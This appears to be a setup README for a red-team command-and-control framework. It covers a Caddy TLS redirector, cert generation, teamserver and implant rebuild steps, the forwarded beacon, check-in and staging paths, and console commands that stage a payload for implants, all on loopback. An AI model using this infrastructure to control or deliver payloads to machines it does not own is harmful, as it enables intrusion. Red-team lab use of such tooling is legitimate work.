# TLS redirector (Caddy)

Terminates TLS on port 443 and reverse-proxies C2 paths to the teamserver on
the host (`127.0.0.1:8443`, plain HTTP). Everything else gets `{"status":"ok"}`.

## 1. Certs

```powershell
mkdir infra\certs -Force
openssl req -x509 -newkey rsa:2048 -keyout infra/certs/key.pem -out infra/certs/cert.pem -days 365 -nodes -subj "/CN=127.0.0.1"
```

## 2. Start teamserver (host)

```powershell
# plain HTTP on loopback — redirector owns TLS
python -m c2
```

Agents/tasks persist under `c2/data/c2.db` (`C2_DB` overrides the path).

## 3. Start redirector

```powershell
docker compose -f infra/docker-compose.yml up -d
```

## 4. Point the implant at the redirector

Rebuild with host/port overrides, or enable the embedded `redirector` profile:

```powershell
cmake -S client -B client/build -G "Visual Studio 17 2022" -A x64 `
  -DC2_HOST_OVERRIDE=127.0.0.1 -DC2_PORT_OVERRIDE=443
# then edit Profile.cpp primary scheme to https, OR enable the redirector
# profile (`"enabled":true`) and disable the plain http profile.
```

Default profile is direct `http://127.0.0.1:8443`. The `redirector` profile is
present but disabled (`https://127.0.0.1:443`, `ignore_cert:true`).

## Paths forwarded

| Path | Purpose |
|------|---------|
| `/register` | check-in |
| `/beacon` | heartbeat / tasks |
| `/chunk` | large results |
| `/rotate_key` | session key rotation |
| `/stage/*` | durable staging |

## Staging via redirector

```text
c2> upload-stage payload.bin
c2> stage https://127.0.0.1/stage/payload
```
